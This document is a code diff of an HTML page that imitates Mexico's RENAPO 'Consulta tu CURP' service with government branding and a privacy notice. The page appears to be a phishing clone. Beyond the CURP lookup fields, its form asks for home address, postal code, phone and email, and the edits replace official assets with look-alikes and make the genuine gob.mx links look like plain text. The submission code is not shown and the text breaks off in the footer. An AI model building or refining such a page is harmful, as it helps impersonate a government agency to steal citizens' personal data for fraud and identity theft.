@@ -5,96 +5,113 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Consulta tu CURP - RENAPO</title>
 <style>
-:root{--guinda:#691C32;--guinda-osc:#5a172b;--guinda-int:#8b1c38;--gris-tab:#f3f3f3;--borde-input:#bdbdbd;--texto:#222222;--suave:#555555;--rojo:#d92d20;--azul-link:#0047ab}
+:root{--guinda:#8b1c38;--guinda-osc:#691c32;--rojo:#d92d20;--azul-link:#0047ab}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto);line-height:1.45}
+body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:#222222;line-height:1.45}
 
-/* ===== Encabezado: degradado rojizo + RENAPO izq + hamburguesa der ===== */
-.header-renapo{
-  background:linear-gradient(90deg,#8b1230 0%,#a01d3f 50%,#c33b60 100%);
-  color:#FFFFFF;
-  padding:14px 18px;
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  width:100%;
-  box-sizing:border-box;
+/* ===== 1) ENCABEZADO NUEVO (rosa/guinda arriba + vino abajo) ===== */
+.header-gob{width:100%}
+.top-bar{
+  background:linear-gradient(90deg,#b8295a 0%,#c63163 60%,#b32455 100%);
+  padding:12px 18px;
+  display:flex;align-items:center;justify-content:space-between;
+  min-height:76px;
 }
-.header-renapo .brand{font-size:17px;font-weight:700;letter-spacing:.6px;color:#FFFFFF;text-decoration:none}
-.header-renapo .menu-toggle{background:transparent;border:none;color:#FFFFFF;font-size:24px;line-height:1;cursor:pointer;padding:2px 4px}
+.brand-gov{display:flex;align-items:center;gap:12px;text-decoration:none;color:#FFFFFF}
+.escudo{width:52px;height:52px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.escudo svg{width:100%;height:100%;fill:#d8a24a}
+.gov-text{display:flex;flex-direction:column;line-height:1.02}
+.gov-sub{font-size:13px;font-weight:500;letter-spacing:.2px;color:#FFFFFF}
+.gov-main{font-size:27px;font-weight:700;letter-spacing:-.4px;color:#FFFFFF}
+.menu-btn{background:transparent;border:none;cursor:pointer;padding:6px;display:flex;flex-direction:column;justify-content:center;gap:5px}
+.menu-btn span{display:block;width:24px;height:2.5px;background-color:#FFFFFF;border-radius:1px}
+.sub-bar{
+  background:linear-gradient(90deg,#563142 0%,#4e2b3b 55%,#5b3446 100%);
+  padding:13px 18px;
+  display:flex;align-items:center;justify-content:flex-start;
+}
+.brand-renapo{color:#FFFFFF;text-decoration:none;font-size:21px;font-weight:600;letter-spacing:.3px;line-height:1}
 
 /* ===== Contenido ===== */
 .container{max-width:920px;margin:0 auto;padding:18px 18px 28px}
 .breadcrumb{font-size:13px;color:#444444;margin-bottom:14px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
 .breadcrumb a{color:#333333;text-decoration:none}
 .breadcrumb .actual{font-weight:700;color:#222222}
+.breadcrumb .sep{color:#9CA3AF}
 .page-title{font-size:32px;font-weight:700;color:#2b2b2b;margin-bottom:18px}
 .section-search-title{font-size:22px;font-weight:700;color:#2b2b2b;padding-bottom:8px;border-bottom:1px solid #d8d8d8;margin-bottom:14px}
 .search-intro{font-size:15px;color:#333333;margin-bottom:18px}
 
 .tabs{display:flex;border-bottom:1px solid #d0d0d0;margin-bottom:18px;gap:6px}
-.tab-btn{background:#f3f3f3;color:#333333;border:1px solid #d0d0d0;border-bottom:none;padding:10px 14px;font-size:14px;font-weight:600;cursor:pointer;border-radius:4px 4px 0 0;font-family:inherit}
+.tab-btn{
+  background:#f3f3f3;color:#333333;
+  border:1px solid #d0d0d0;border-bottom:none;
+  padding:10px 14px;font-size:14px;font-weight:600;
+  cursor:pointer;border-radius:4px 4px 0 0;
+  font-family:inherit;text-align:left;
+}
 .tab-btn.active{background:#8b1c38;color:#FFFFFF;border-color:#8b1c38}
-.tab-btn:disabled,.tab-btn.is-disabled{border:1.5px solid var(--rojo);color:#b42318;background:#fef3f2;cursor:not-allowed}
+.tab-btn:disabled,.tab-btn.is-disabled{border:1.5px solid #d92d20;color:#b42318;background:#fef3f2;cursor:not-allowed}
 
 .form-group{margin-bottom:14px}
-.form-label{display:block;font-size:15px;font-weight:700;color:#2b2b2b;margin-bottom:8px}
-.form-control{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--borde-input);border-radius:4px;color:var(--texto);background:#FFFFFF;outline:none;font-family:inherit}
+.form-label{display:block;font-size:15px;font-weight:700;color:#2b2b2b;margin-bottom:8px;line-height:1.25}
+.form-control{
+  width:100%;padding:11px 12px;font-size:15px;
+  border:1px solid #bdbdbd;border-radius:4px;
+  color:#222222;background:#FFFFFF;outline:none;font-family:inherit;
+}
 .form-control::placeholder{color:#888888;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
 .form-control:focus{border-color:#8b1c38}
-.form-control:disabled,.form-control.is-disabled,.form-control.is-error{border:1.5px solid var(--rojo);background:#fffafa}
+.form-control.is-error,.form-control.is-disabled,.form-control:disabled{border:1.5px solid #d92d20;background:#fffafa}
+.form-control.is-error:focus{border-color:#d92d20}
+select.form-control{padding:10px 12px;height:44px}
 
-.help-curp-link{display:inline-block;margin-top:6px;margin-bottom:14px;font-size:14px;color:#0b57d0;text-decoration:underline;font-family:inherit;background:none;border:none;padding:0;cursor:pointer}
-.required-note{font-size:13px;color:var(--suave);margin-bottom:14px}
+.help-curp-link{
+  display:inline-block;margin-top:6px;margin-bottom:14px;
+  font-size:14px;color:#0b57d0;text-decoration:underline;font-family:inherit;
+  background:none;border:none;padding:0;cursor:pointer;
+}
+.help-curp-link:active{opacity:.7}
+.required-note{font-size:13px;color:#555555;margin-bottom:14px}
+.btn-buscar{
+  background-color:#8b1c38;color:#FFFFFF;border:none;border-radius:4px;
+  padding:10px 22px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;
+  display:inline-flex;align-items:center;gap:6px;
+}
+.btn-buscar:hover{background-color:#691c32}
+.btn-buscar:disabled,.btn-buscar.is-disabled{border:1.5px solid #d92d20;background:#fef3f2;color:#b42318;cursor:not-allowed}
 
-.btn-buscar{background-color:#8b1c38;color:#FFFFFF;border:none;border-radius:4px;padding:10px 22px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:6px}
-.btn-buscar:hover{background-color:var(--guinda)}
-.btn-buscar:disabled,.btn-buscar.is-disabled{border:1.5px solid var(--rojo);background:#fef3f2;color:#b42318;cursor:not-allowed}
-
-.barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
-.barra-inferior .obligatorios{font-size:13px;color:var(--suave)}
-.tel-row{display:flex;gap:6px}
-.tel-lada{flex:0 0 44%;display:flex;align-items:center;gap:4px;padding:0 6px;border:1px solid var(--borde-input);border-radius:4px;background:#FFFFFF;font-size:13px;height:40px;overflow:hidden}
-.tel-lada select{border:0;padding:0;height:auto;font-size:13px;background:transparent;flex:1;outline:none;font-family:inherit;min-width:0}
-.tel-num{flex:1}
-.cp-info{font-size:12px;color:#1c9c4c;font-weight:700;margin-top:4px;min-height:10px}
-.load{width:11px;height:11px;border:2px solid #FFFFFF;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block}
-@keyframes s{to{transform:rotate(360deg)}}
 .panel-oculto{display:none}
+.seccion-titulo{font-size:14px;font-weight:700;color:#8b1c38;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:10px 0 12px}
+.cp-info{font-size:12px;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
+.tel-row{display:flex;gap:6px}
+.tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;padding:0 6px;border:1px solid #bdbdbd;border-radius:4px;background:#FFFFFF;font-size:14px}
+.tel-lada select{border:0;padding:10px 0;font-size:14px;background:transparent;flex:1;outline:none;font-family:inherit}
+.tel-num{flex:1}
+.load{width:11px;height:11px;border:2px solid #FFFFFF;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
+@keyframes s{to{transform:rotate(360deg)}}
 
-/* ===== Recuadros informativos ===== */
+/* ===== Recuadros informativos azules ===== */
 .info-boxes{margin-top:24px;display:flex;flex-direction:column;gap:16px}
-.info-box{background-color:#dff2fc;border:1px solid #b6dff5;border-radius:6px;padding:20px 16px;text-align:center;color:var(--texto);font-size:15px}
-.info-box-title{font-size:17px;font-weight:700;color:var(--texto);margin-bottom:10px}
-.info-box p{color:var(--texto);margin-bottom:10px}
+.info-box{
+  background-color:#dff2fc;border:1px solid #b6dff5;border-radius:6px;
+  padding:20px 16px;text-align:center;color:#222222;font-size:15px;
+}
+.info-box-title{font-size:17px;font-weight:700;color:#222222;margin-bottom:10px}
+.info-box p{color:#222222;margin-bottom:10px}
 .info-box p:last-child{margin-bottom:0}
-.info-url{color:var(--azul-link);text-decoration:underline;text-decoration-color:var(--azul-link);text-underline-offset:2px;font-weight:600;word-break:break-word}
+/* ===== 3) URLs SIN color azul ni subrayado (texto normal) ===== */
+.info-url{
+  color:#222222;
+  text-decoration:none;
+  font-weight:400;
+  word-break:break-word;
+}
 
-/* ===== Pie rojo (antiguo) ===== */
-.footer-gob{background:linear-gradient(180deg,#9f2241 0%,#8b1c38 100%);color:#FFFFFF;padding:28px 22px;width:100%}
-.footer-list{list-style:none;margin-bottom:22px}
-.footer-item{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.16)}
-.footer-item:last-child{border-bottom:none}
-.footer-link{color:#FFFFFF;text-decoration:none;font-size:16px;font-weight:600;line-height:1.35}
-.footer-link.underline{text-decoration:underline;text-underline-offset:3px}
-.footer-chevron{font-size:16px;color:#FFFFFF;opacity:.9;margin-left:12px}
-.footer-social{margin-top:8px;margin-bottom:24px}
-.footer-social-label{display:block;font-size:15px;font-weight:600;margin-bottom:14px}
-.social-icons{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
-.social-icons a{color:#FFFFFF;text-decoration:none;font-size:20px;font-weight:bold;display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px}
-.social-ig{width:20px !important;height:20px !important;border:2px solid #FFFFFF;border-radius:6px;position:relative}
-.social-ig::before{content:"";width:8px;height:8px;border:2px solid #FFFFFF;border-radius:50%}
-.social-ig::after{content:"";width:3px;height:3px;background:#FFFFFF;border-radius:50%;position:absolute;top:2px;right:2px}
-.social-yt{width:24px !important;height:18px !important;border:2px solid #FFFFFF;border-radius:5px;font-size:10px !important;line-height:1}
-.footer-help{display:flex;align-items:center;gap:12px;padding-top:6px}
-.help-asterisk{font-size:28px;font-weight:bold;line-height:1;flex-shrink:0}
-.help-number{font-size:30px;font-weight:700;letter-spacing:-.5px;line-height:1;flex-shrink:0}
-.help-text{font-size:13px;line-height:1.25;color:#FFFFFF;max-width:170px}
-
-/* ===== RECUADRO FINAL GOBIERNO (nuevo) ===== */
+/* ===== 2) FOOTER ÚNICO (recuadro-final-gob) ===== */
 .recuadro-final-gob{
   background-color:#9f2241;
-  color:#ffffff;
+  color:#FFFFFF;
   padding:28px 20px;
   font-family:Arial,Helvetica,sans-serif;
   display:flex;
@@ -105,37 +122,66 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto
 }
 .recuadro-final-encabezado{display:flex;align-items:center;gap:12px}
 .recuadro-final-escudo{width:68px;height:auto;flex-shrink:0}
-.recuadro-final-titulo-gob{font-size:20px;font-weight:700;line-height:1.05;color:#ffffff}
+.recuadro-final-titulo-gob{font-size:20px;font-weight:700;line-height:1.05;color:#FFFFFF}
 .recuadro-final-lista{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:16px}
 .recuadro-final-item{display:flex;align-items:center;justify-content:space-between}
-.recuadro-final-enlace{color:#ffffff;text-decoration:none;font-size:16px;font-weight:600;line-height:1.3}
+.recuadro-final-enlace{color:#FFFFFF;text-decoration:none;font-size:16px;font-weight:600;line-height:1.3}
 .recuadro-final-enlace.subrayado{text-decoration:underline;text-underline-offset:3px}
-.recuadro-final-flecha{color:#ffffff;font-size:16px;margin-left:12px}
+.recuadro-final-flecha{color:#FFFFFF;font-size:16px;margin-left:12px}
 .recuadro-final-redes{display:flex;flex-direction:column;gap:12px}
-.recuadro-final-redes-texto{font-size:15px;font-weight:600;color:#ffffff}
+.recuadro-final-redes-texto{font-size:15px;font-weight:600;color:#FFFFFF}
 .recuadro-final-iconos{display:flex;align-items:center;gap:18px}
-.recuadro-final-icono{color:#ffffff;text-decoration:none;font-size:21px;font-weight:700;line-height:1;display:inline-flex;align-items:center;justify-content:center}
+.recuadro-final-icono{
+  color:#FFFFFF;text-decoration:none;
+  display:inline-flex;align-items:center;justify-content:center;
+  width:28px;height:28px;
+}
+.recuadro-final-icono svg{width:24px;height:24px;fill:#FFFFFF}
 .recuadro-final-079{display:flex;align-items:center;gap:12px;padding-top:4px}
-.recuadro-final-asterisco{font-size:32px;font-weight:700;line-height:1;color:#ffffff}
-.recuadro-final-numero{font-size:36px;font-weight:700;line-height:1;letter-spacing:-0.5px;color:#ffffff}
-.recuadro-final-ayuda{font-size:14px;line-height:1.25;color:#ffffff;margin:0}
+.recuadro-final-asterisco{font-size:32px;font-weight:700;line-height:1;color:#FFFFFF}
+.recuadro-final-numero{font-size:36px;font-weight:700;line-height:1;letter-spacing:-.5px;color:#FFFFFF}
+.recuadro-final-ayuda{font-size:14px;line-height:1.25;color:#FFFFFF;margin:0}
 </style>
 </head>
 <body>
 
-<!-- ===== ENCABEZADO (solo RENAPO + hamburguesa con degradado rojizo) ===== -->
-<header class="header-renapo">
-  <a href="#renapo" class="brand">RENAPO</a>
-  <button type="button" class="menu-toggle" aria-label="Menú">&#9776;</button>
+<!-- ===== 1) ENCABEZADO NUEVO ===== -->
+<header class="header-gob">
+  <div class="top-bar">
+    <a href="#" class="brand-gov" aria-label="Gobierno de México">
+      <span class="escudo" aria-hidden="true">
+        <svg viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="44" fill="none" stroke="#d8a24a" stroke-width="4" stroke-dasharray="4 3"/>
+          <circle cx="50" cy="50" r="35" fill="none" stroke="#d8a24a" stroke-width="2.5"/>
+          <path d="M50 24 C42 34, 44 46, 50 54 C56 46, 58 34, 50 24 Z"/>
+          <path d="M26 52 C35 46, 44 50, 50 58 C40 62, 30 60, 26 52 Z"/>
+          <path d="M74 52 C65 46, 56 50, 50 58 C60 62, 70 60, 74 52 Z"/>
+          <path d="M32 68 Q50 78 68 68" fill="none" stroke="#d8a24a" stroke-width="4" stroke-linecap="round"/>
+        </svg>
+      </span>
+      <span class="gov-text">
+        <span class="gov-sub">Gobierno de</span>
+        <span class="gov-main">México</span>
+      </span>
+    </a>
+    <button type="button" class="menu-btn" aria-label="Abrir menú">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="sub-bar">
+    <a href="#" class="brand-renapo">RENAPO</a>
+  </div>
 </header>
 
 <main class="container">
   <!-- ===== RUTA ===== -->
   <nav class="breadcrumb" aria-label="Ruta de navegación">
     <span>&#127968;</span>
-    <span>&gt;</span>
+    <span class="sep">&gt;</span>
     <a href="#inicio">Inicio</a>
-    <span>&gt;</span>
+    <span class="sep">&gt;</span>
     <span class="actual">Consulta tu CURP</span>
   </nav>
 
@@ -157,57 +203,67 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto
     </div>
 
     <form id="curpForm" novalidate>
-      <!-- ===== Panel CURP ===== -->
+      <!-- ===== PANEL CURP ===== -->
       <div id="panel-curp">
         <div class="form-group">
-          <label for="curp" class="form-label">Clave &Uacute;nica de Registro de Poblaci&oacute;n (CURP)*:</label>
-          <input type="text" id="curp" name="curp" class="form-control" placeholder="INGRESA TU CURP" maxlength="18" autocomplete="off" style="text-transform:uppercase" />
+          <label for="curpInput" class="form-label">
+            Clave &Uacute;nica de Registro de Poblaci&oacute;n (CURP)*:
+          </label>
+          <input
+            type="text"
+            id="curpInput"
+            name="curp"
+            class="form-control"
+            placeholder="INGRESA TU CURP"
+            maxlength="18"
+            autocomplete="off"
+            style="text-transform:uppercase"
+          />
           <button type="button" class="help-curp-link" onclick="cambiarTab('datos')">&iquest;No conoces tu CURP?</button>
         </div>
       </div>
 
-      <!-- ===== Panel Datos Personales ===== -->
+      <!-- ===== PANEL DATOS PERSONALES ===== -->
       <div id="panel-datos" class="panel-oculto">
-        <div class="form-group"><label for="nombre" class="form-label">Nombre(s)*:</label><input id="nombre" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU NOMBRE(S)" /></div>
-        <div class="form-group"><label for="primer-apellido" class="form-label">Primer apellido*:</label><input id="primer-apellido" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU PRIMER APELLIDO" /></div>
-        <div class="form-group"><label for="segundo-apellido" class="form-label">Segundo apellido:</label><input id="segundo-apellido" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU SEGUNDO APELLIDO" /></div>
+        <div class="form-group"><label for="nombre" class="form-label">Nombre(s)*:</label><input id="nombre" type="text" class="form-control" placeholder="INGRESA TU NOMBRE(S)" autocomplete="off" /></div>
+        <div class="form-group"><label for="primer-apellido" class="form-label">Primer apellido*:</label><input id="primer-apellido" type="text" class="form-control" placeholder="INGRESA TU PRIMER APELLIDO" autocomplete="off" /></div>
+        <div class="form-group"><label for="segundo-apellido" class="form-label">Segundo apellido:</label><input id="segundo-apellido" type="text" class="form-control" placeholder="INGRESA TU SEGUNDO APELLIDO" autocomplete="off" /></div>
         <div class="form-group"><label for="dia" class="form-label">D&iacute;a de nacimiento*:</label><select id="dia" class="form-control"><option value="">Seleccionar el d&iacute;a</option></select></div>
         <div class="form-group"><label for="mes" class="form-label">Mes de nacimiento*:</label><select id="mes" class="form-control"><option value="">Seleccionar el mes</option></select></div>
         <div class="form-group"><label for="anio" class="form-label">A&ntilde;o de nacimiento*:</label><select id="anio" class="form-control"><option value="">Seleccionar el a&ntilde;o</option></select></div>
         <div class="form-group"><label for="sexo" class="form-label">Sexo*:</label><select id="sexo" class="form-control"><option value="">Selecciona el sexo</option><option>Mujer</option><option>Hombre</option></select></div>
         <div class="form-group"><label for="estado" class="form-label">Estado*:</label><select id="estado" class="form-control"><option value="">Selecciona el estado</option><option>Ciudad de M&eacute;xico</option><option>Estado de M&eacute;xico</option><option>Hidalgo</option><option>Jalisco</option><option>Nuevo Le&oacute;n</option><option>Puebla</option><option>Veracruz</option><option>Guanajuato</option><option>Michoac&aacute;n</option><option>Oaxaca</option><option>Otro</option></select></div>
 
-        <h3 style="font-size:15px;font-weight:700;color:#8b1c38;margin:14px 0 10px;padding-bottom:6px;border-bottom:1px solid #e5e5e5">Domicilio y contacto</h3>
+        <div class="seccion-titulo">Domicilio y contacto</div>
 
-        <div class="form-group"><label for="calle" class="form-label">Calle*:</label><input id="calle" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU CALLE" /></div>
-        <div class="form-group"><label for="num-ext" class="form-label">N&uacute;mero exterior*:</label><input id="num-ext" type="text" class="form-control" autocomplete="off" placeholder="EJ. 123" /></div>
-        <div class="form-group"><label for="num-int" class="form-label">N&uacute;mero interior:</label><input id="num-int" type="text" class="form-control" autocomplete="off" placeholder="EJ. INT. 4" /></div>
-        <div class="form-group"><label for="cp" class="form-label">C&oacute;digo postal*:</label><input id="cp" type="text" class="form-control" maxlength="5" autocomplete="off" placeholder="EJ. 01730" /><div class="cp-info" id="cpInfo"></div></div>
-        <div class="form-group"><label for="colonia" class="form-label">Colonia*:</label><input id="colonia" type="text" class="form-control" autocomplete="off" placeholder="EJ. CENTRO" /></div>
-        <div class="form-group"><label for="municipio" class="form-label">Delegaci&oacute;n / Municipio*:</label><input id="municipio" type="text" class="form-control" autocomplete="off" placeholder="EJ. CUAUHT&Eacute;MOC" /></div>
-        <div class="form-group"><label for="estado-dom" class="form-label">Estado*:</label><input id="estado-dom" type="text" class="form-control" autocomplete="off" placeholder="EJ. CIUDAD DE M&Eacute;XICO" /></div>
-        <div class="form-group"><label for="entre" class="form-label">Entre qu&eacute; calles:</label><input id="entre" type="text" class="form-control" autocomplete="off" placeholder="EJ. HIDALGO Y MORELOS" /></div>
+        <div class="form-group"><label for="calle" class="form-label">Calle*:</label><input id="calle" type="text" class="form-control" placeholder="INGRESA TU CALLE" autocomplete="off" /></div>
+        <div class="form-group"><label for="num-ext" class="form-label">N&uacute;mero exterior*:</label><input id="num-ext" type="text" class="form-control" placeholder="Ej. 123" autocomplete="off" /></div>
+        <div class="form-group"><label for="num-int" class="form-label">N&uacute;mero interior:</label><input id="num-int" type="text" class="form-control" placeholder="Ej. Int. 4" autocomplete="off" /></div>
+        <div class="form-group"><label for="cp" class="form-label">C&oacute;digo postal*:</label><input id="cp" type="text" maxlength="5" class="form-control" placeholder="Ej. 01730" autocomplete="off" /><div class="cp-info" id="cpInfo"></div></div>
+        <div class="form-group"><label for="colonia" class="form-label">Colonia*:</label><input id="colonia" type="text" class="form-control" placeholder="Ej. Centro" autocomplete="off" /></div>
+        <div class="form-group"><label for="municipio" class="form-label">Delegaci&oacute;n / Municipio*:</label><input id="municipio" type="text" class="form-control" placeholder="Ej. Cuauht&eacute;moc" autocomplete="off" /></div>
+        <div class="form-group"><label for="estado-dom" class="form-label">Estado*:</label><input id="estado-dom" type="text" class="form-control" placeholder="Ej. Ciudad de M&eacute;xico" autocomplete="off" /></div>
+        <div class="form-group"><label for="entre" class="form-label">Entre qu&eacute; calles:</label><input id="entre" type="text" class="form-control" placeholder="Ej. Hidalgo y Morelos" autocomplete="off" /></div>
         <div class="form-group">
           <label for="telefono" class="form-label">Tel&eacute;fono*:</label>
           <div class="tel-row">
             <div class="tel-lada"><select id="lada"></select></div>
-            <input id="telefono" class="tel-num form-control" type="tel" autocomplete="off" placeholder="10 D&Iacute;GITOS" />
+            <input id="telefono" class="tel-num form-control" type="tel" autocomplete="off" placeholder="10 d&iacute;gitos" />
           </div>
         </div>
-        <div class="form-group"><label for="email" class="form-label">Correo electr&oacute;nico*:</label><input id="email" type="email" class="form-control" autocomplete="off" placeholder="CORREO@DOMINIO.COM" /></div>
+        <div class="form-group"><label for="email" class="form-label">Correo electr&oacute;nico*:</label><input id="email" type="email" class="form-control" placeholder="correo@dominio.com" autocomplete="off" /></div>
       </div>
 
-      <div class="barra-inferior">
-        <span class="obligatorios">* Campos obligatorios</span>
-        <button type="submit" class="btn-buscar" id="btnBuscar">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-          Buscar
-        </button>
-      </div>
+      <p class="required-note">* Campos obligatorios</p>
+
+      <button type="submit" class="btn-buscar" id="btnBuscar">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        Buscar
+      </button>
     </form>
   </section>
 
-  <!-- ===== RECUADROS INFORMATIVOS ===== -->
+  <!-- ===== RECUADROS INFORMATIVOS (URLs sin azul) ===== -->
   <section class="info-boxes" aria-label="Información adicional">
     <div class="info-box">
       <h3 class="info-box-title">&iexcl;Sugerencia!</h3>
@@ -219,47 +275,29 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto
       <h3 class="info-box-title">Aviso de privacidad simplificado de consulta de CURP en l&iacute;nea</h3>
       <p>
         La recolecci&oacute;n de datos personales se lleva a cabo a trav&eacute;s de
-        <a href="https://www.gob.mx/curp" class="info-url" target="_blank" rel="noopener noreferrer">https://www.gob.mx/curp</a>,
+        <a href="https://www.gob.mx/curp" class="info-url">https://www.gob.mx/curp</a>,
         cuyo administrador y responsable del tr&aacute;mite de CURP es la Direcci&oacute;n General del Registro Nacional de Poblaci&oacute;n e Identidad de la Secretar&iacute;a de Gobernaci&oacute;n.
       </p>
       <p>Los datos personales que se recaban ser&aacute;n utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
       <p>
         Conoce el aviso de privacidad integral en
-        <a href="https://www.gob.mx/curp/privacidadintegral" class="info-url" target="_blank" rel="noopener noreferrer">https://www.gob.mx/curp/privacidadintegral</a>.
+        <a href="https://www.gob.mx/curp/privacidadintegral" class="info-url">https://www.gob.mx/curp/privacidadintegral</a>.
       </p>
     </div>
   </section>
 </main>
 
-<!-- ===== PIE ROJO ===== -->
-<footer class="footer-gob" aria-label="Pie de página">
-  <ul class="footer-list">
-    <li class="footer-item"><a href="#enlaces" class="footer-link">Enlaces</a><span class="footer-chevron" aria-hidden="true">&#8964;</span></li>
-    <li class="footer-item"><a href="#que-es-gobmx" class="footer-link">&iquest;Qu&eacute; es gob.mx?</a><span class="footer-chevron" aria-hidden="true">&#8964;</span></li>
-    <li class="footer-item"><a href="#denuncia" class="footer-link underline">Denuncia contra servidores p&uacute;blicos</a></li>
-  </ul>
-
-  <div class="footer-social">
-    <span class="footer-social-label">S&iacute;guenos en</span>
-    <div class="social-icons">
-      <a href="#facebook" aria-label="Facebook">f</a>
-      <a href="#x" aria-label="X">&#120159;</a>
-      <a href="#instagram" class="social-ig" aria-label="Instagram"></a>
-      <a href="#youtube" class="social-yt" aria-label="YouTube">&#9654;</a>
-    </div>
-  </div>
-
-  <div class="footer-help">
-    <span class="help-asterisk" aria-hidden="true">&#10033;</span>
-    <span class="help-number">079</span>
-    <p class="help-text">Comun&iacute;cate, estamos para ayudarte</p>
-  </div>
-</footer>
-
-<!-- ===== RECUADRO FINAL GOBIERNO (NUEVO) ===== -->
-<div class="recuadro-final-gob">
+<!-- ===== 2) FOOTER ÚNICO (recuadro-final-gob) con íconos SVG reales ===== -->
+<footer class="recuadro-final-gob" aria-label="Pie de página">
   <div class="recuadro-final-encabezado">
-    <img src="https://framework-gb.cdn.gob.mx/landing/img/logoheader.svg" alt="Gobierno de México" class="recuadro-final-escudo" />
+    <svg class="recuadro-final-escudo" viewBox="0 0 100 100" aria-label="Gobierno de México">
+      <circle cx="50" cy="50" r="44" fill="none" stroke="#d8a24a" stroke-width="4" stroke-dasharray="4 3"/>
+      <circle cx="50" cy="50" r="35" fill="none" stroke="#d8a24a" stroke-width="2.5"/>
+      <path d="M50 24 C42 34, 44 46, 50 54 C56 46, 58 34, 50 24 Z" fill="#d8a24a"/>
+      <path d="M26 52 C35 46, 44 50, 50 58 C40 62, 30 60, 26 52 Z" fill="#d8a24a"/>
+      <path d="M74 52 C65 46, 56 50, 50 58 C60 62, 70 60, 74 52 Z" fill="#d8a24a"/>
+      <path d="M32 68 Q50 78 68 68" fill="none" stroke="#d8a24a" stroke-width="4" stroke-linecap="round"/>
+    </svg>
     <span class="recuadro-final-titulo-gob">Gobierno de<br />M&eacute;xico</span>
   </div>
 
@@ -280,10 +318,22 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto
   <div class="recuadro-final-redes">
     <span class="recuadro-final-redes-texto">S&iacute;guenos en</span>
     <div class="recuadro-final-iconos">
-      <a href="#facebook" class="recuadro-final-icono" aria-label="Facebook">f</a>
-      <a href="#x" class="recuadro-final-icono" aria-label="X">&#120159;</a>
-      <a href="#instagram" class="recuadro-final-icono" aria-label="Instagram">&#9678;</a>
-      <a href="#youtube" class="recuadro-final-icono" aria-label="YouTube">&#9658;</a>
+      <!-- Facebook -->
+      <a href="#facebook" class="recuadro-final-icono" aria-label="Facebook">
+        <svg viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 5 3.66 9.13 8.44 9.88v-6.99H7.9V12h2.54V9.8c0-2.5 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56V12h2.78l-.45 2.89h-2.33v6.99C18.34 21.13 22 16.99 22 12z"/></svg>
+      </a>
+      <!-- X (Twitter) -->
+      <a href="#x" class="recuadro-final-icono" aria-label="X">
+        <svg viewBox="0 0 24 24"><path d="M18.9 2H22l-7.5 8.6L23 22h-6.9l-5.4-7.1L4.5 22H1.4l8.1-9.3L1 2h7l4.9 6.5L18.9 2zm-1.2 18h1.9L7.4 4H5.4l12.3 16z"/></svg>
+      </a>
+      <!-- Instagram -->
+      <a href="#instagram" class="recuadro-final-icono" aria-label="Instagram">
